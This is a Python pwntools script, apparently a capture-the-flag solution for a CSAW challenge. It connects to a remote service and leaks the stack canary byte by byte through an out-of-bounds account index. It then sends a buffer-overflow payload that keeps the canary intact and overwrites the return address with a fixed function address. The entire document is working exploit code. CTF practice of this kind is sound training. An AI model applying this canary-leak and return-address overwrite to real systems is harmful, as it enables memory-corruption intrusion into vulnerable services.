from pwn import *

# Connect to the remote server
p = remote("pwn.csaw.io", 7900)


# Function to fill an account with data
def fill_account(data):
    p.sendlineafter("> ", "F")
    p.sendline(data)


# Function to view account info at a specific index
def view_account(index):
    p.sendlineafter(b"> ", b"V")
    p.sendline(str(index).encode())
    p.recvuntil(b"Index ")
    val = p.recvuntil(b"\n", drop=True)
    return val[-2:].decode("utf-8")


# Function to exit the program
def exit_program():
    p.sendlineafter(b"> ", b"E")


offset = 128
canary = b""


for i in range(4):
    a = view_account(offset + i)
    print(a)
    canary += bytes.fromhex(a)  # chr(int(a, 16)).encode()

print(canary)
payload = 64 * b"A" + canary

context.log_level = "debug"
target = p32(0x08049304)
print(target)

payload += p32(0xDEADBEEF)
payload += target
print(payload)

exit_program()
p.sendlineafter(b": ", str(len(payload)).encode())
p.sendlineafter(b": ", payload)
print(p.recvall().strip().decode("utf-8"))